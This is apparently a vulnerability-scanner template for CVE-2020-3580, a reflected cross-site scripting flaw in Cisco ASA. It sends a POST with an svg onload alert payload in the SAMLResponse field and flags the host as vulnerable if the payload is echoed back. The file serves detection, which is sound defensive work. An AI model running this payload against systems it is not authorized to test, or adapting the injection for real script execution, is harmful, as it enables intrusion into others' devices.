id:
name: CVE-2020-3580
transport: http
tags:
  - Cisco-ASA
rules:
  req:
    request:
      cache: true
      method: POST
      path: /+CSCOE+/saml/sp/acs?tgname=a
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
      follow_redirects: true
    expression: response.status==200 &&
                response.body.bcontains(b'<svg/onload=alert(/{{randstr}}/)>') &&
                response.content_type.contains('text/html')
expression: req()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2020-3580漏洞"